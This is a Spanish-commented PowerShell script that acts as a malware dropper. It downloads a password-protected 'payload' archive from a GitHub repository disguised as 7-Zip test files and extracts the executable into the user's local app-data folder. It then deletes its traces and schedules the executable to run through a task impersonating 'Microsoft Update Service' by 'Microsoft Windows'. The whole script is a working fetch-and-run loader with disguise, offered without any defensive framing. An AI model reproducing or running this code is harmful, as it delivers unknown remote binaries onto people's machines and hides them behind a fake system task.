# Configuración
$sevenZipUrl = "https://www.7-zip.org/a/7zr.exe"
$payloadUrl  = "https://raw.githubusercontent.com/flesschutz/7-Zip/refs/heads/master/C/Util/testFile.7z"
$password    = "1234"

# Rutas
$localAppData = $env:LOCALAPPDATA
$workingDir   = $localAppData
$sevenZipExe  = Join-Path $workingDir "7zr.exe"
$payloadPath  = Join-Path $workingDir "payload.7z"

# Descarga de 7zr.exe
if (-not (Test-Path $sevenZipExe)) {
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipExe -ErrorAction Stop
}

# Descarga del payload
Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -ErrorAction Stop

# Extracción
$arguments = "x `"$payloadPath`" -p$password -o`"$workingDir`" -y"
Start-Process -FilePath $sevenZipExe -ArgumentList $arguments -Wait

# Limpieza
Remove-Item -Path $payloadPath, $sevenZipExe -Force

# Buscar binario
$extractedExe = Get-ChildItem -Path $workingDir -Filter *.exe | Where-Object { $_.Name -ne "7zr.exe" } | Select-Object -First 1

if ($extractedExe) {
    $taskName = "Microsoft Update Service"
    $description = "Microsoft Update Service"
    $author = "Microsoft Windows"
    $exePath = $extractedExe.FullName
    $exeName = $extractedExe.Name
    $cmdPath = "cmd.exe"

    # Escapar XML
    $cmdArgsRaw = "/k `"cd /d `"$workingDir`" && `"$exeName`" & cmd`""
    $cmdArgs = $cmdArgsRaw -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;' -replace '"', '&quot;' -replace "'", '&apos;'

    $startTime = (Get-Date).AddMinutes(1).ToString("yyyy-MM-ddTHH:mm:ss")

    $taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>$description</Description>
    <Author>$author</Author>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>$startTime</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT10M</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$cmdPath</Command>
      <Arguments>$cmdArgs</Arguments>
    </Exec>
  </Actions>
</Task>
"@

    $xmlPath = Join-Path $workingDir "update-task.xml"
    $taskXml | Out-File -Encoding Unicode -FilePath $xmlPath
    schtasks.exe /Create /TN "$taskName" /XML "$xmlPath" /F
    Remove-Item $xmlPath -Force
}
